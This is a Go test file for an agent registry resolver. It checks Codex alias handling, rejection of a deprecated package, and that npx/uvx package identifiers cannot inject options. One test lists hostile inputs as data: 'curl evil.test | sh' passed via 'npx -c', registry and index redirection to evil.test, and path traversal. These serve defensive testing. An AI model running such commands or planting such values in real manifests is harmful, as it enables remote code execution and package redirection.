package agentmgr

import (
	"strings"
	"testing"

	"github.com/Josepavese/matrix/internal/logic/agentidentity"
)

func TestFindAgentResolvesCodexAliasToCanonicalRegistryID(t *testing.T) {
	agents := []AgentManifest{{ID: "codex-acp", Version: "1.1.2"}}

	got, err := findAgent(agents, "codex")
	if err != nil {
		t.Fatalf("findAgent failed: %v", err)
	}
	if got.ID != "codex-acp" {
		t.Fatalf("resolved id = %q", got.ID)
	}
}

func TestFindAgentRejectsCodexProviderIdentifierAsPublicAgentID(t *testing.T) {
	agents := []AgentManifest{{ID: "codex-acp", Version: "1.1.4"}}

	_, err := findAgent(agents, "codex-acp")
	if err == nil || !strings.Contains(err.Error(), `use "codex"`) {
		t.Fatalf("expected canonical Matrix agent ID error, got %v", err)
	}
}

func TestResolveAnyDistributionRejectsDeprecatedCodexPackage(t *testing.T) {
	client := NewRegistryClient(nil, "")
	manifest := &AgentManifest{ID: "codex-acp", Distribution: RegistryDistribution{
		Npx: &NpxDist{Package: agentidentity.DeprecatedCodexPackage + "@0.16.0"},
	}}

	_, err := client.ResolveAnyDistribution(manifest)
	if err == nil || !strings.Contains(err.Error(), "@agentclientprotocol/codex-acp") {
		t.Fatalf("expected canonical replacement error, got %v", err)
	}
}

func TestResolveAnyDistributionAcceptsCanonicalCodexPackage(t *testing.T) {
	client := NewRegistryClient(nil, "")
	manifest := &AgentManifest{ID: "codex-acp", Distribution: RegistryDistribution{
		Npx: &NpxDist{Package: "@agentclientprotocol/codex-acp@1.1.2"},
	}}

	got, err := client.ResolveAnyDistribution(manifest)
	if err != nil {
		t.Fatalf("ResolveAnyDistribution failed: %v", err)
	}
	if got.Command != "npx" || len(got.Args) != 2 || got.Args[1] != "@agentclientprotocol/codex-acp@1.1.2" {
		t.Fatalf("unexpected resolved distribution: %+v", got)
	}
}

// TestResolveAnyDistributionRejectsOptionShapedPackageIdentifiers is the argv
// half of G6: the package identifier becomes an argument of npx/uvx, and both
// parse their own options anywhere on the command line, so a value starting
// with "-" would stop being a package and decide what runs instead.
func TestResolveAnyDistributionRejectsOptionShapedPackageIdentifiers(t *testing.T) {
	client := NewRegistryClient(nil, "")
	cases := []struct {
		name    string
		npx     *NpxDist
		uvx     *UvxDist
		wantErr string
	}{
		{"npx call option", &NpxDist{Package: "-c", Args: []string{"curl evil.test | sh"}}, nil, "would read as an option"},
		{"npx registry redirection", &NpxDist{Package: "--registry=http://evil.test"}, nil, "would read as an option"},
		{"npx injected option", &NpxDist{Package: "opencode --registry=http://evil.test"}, nil, "not a valid package name"},
		{"npx traversal", &NpxDist{Package: "../../evil"}, nil, "not a valid package name"},
		{"uvx from option", nil, &UvxDist{Package: "--from", Args: []string{"evil"}}, "would read as an option"},
		{"uvx index redirection", nil, &UvxDist{Package: "--index-url=http://evil.test/simple"}, "would read as an option"},
	}
	for _, test := range cases {
		t.Run(test.name, func(t *testing.T) {
			manifest := &AgentManifest{ID: "hostile", Distribution: RegistryDistribution{Npx: test.npx, Uvx: test.uvx}}
			resolved, err := client.ResolveAnyDistribution(manifest)
			if err == nil {
				t.Fatalf("hostile package identifier resolved to %+v", resolved)
			}
			if !strings.Contains(err.Error(), test.wantErr) {
				t.Fatalf("refusal must contain %q, got %v", test.wantErr, err)
			}
		})
	}
}

// TestResolveAnyDistributionKeepsLivePackageIdentifiersWorkable is the
// compatibility floor at the resolver: the npx and uvx entries the live index
// publishes still resolve to exactly the argv they resolved to before.
func TestResolveAnyDistributionKeepsLivePackageIdentifiersWorkable(t *testing.T) {
	client := NewRegistryClient(nil, "")
	manifest := &AgentManifest{ID: "claude-acp", Distribution: RegistryDistribution{
		Npx: &NpxDist{Package: "@agentclientprotocol/claude-agent-acp@0.81.1", Args: []string{"--acp"}},
	}}
	resolved, err := client.ResolveAnyDistribution(manifest)
	if err != nil {
		t.Fatalf("live npx entry must resolve, got %v", err)
	}
	if got := strings.Join(resolved.Args, " "); got != "-y @agentclientprotocol/claude-agent-acp@0.81.1 --acp" {
		t.Fatalf("npx argv = %q", got)
	}

	uvxManifest := &AgentManifest{ID: "fast-agent", Distribution: RegistryDistribution{
		Uvx: &UvxDist{Package: "fast-agent-acp==0.10.1", Args: []string{"-x"}},
	}}
	resolved, err = client.ResolveAnyDistribution(uvxManifest)
	if err != nil {
		t.Fatalf("live uvx entry must resolve, got %v", err)
	}
	if resolved.Command != "uvx" || strings.Join(resolved.Args, " ") != "fast-agent-acp==0.10.1 -x" {
		t.Fatalf("uvx argv = %q %q", resolved.Command, strings.Join(resolved.Args, " "))
	}
}
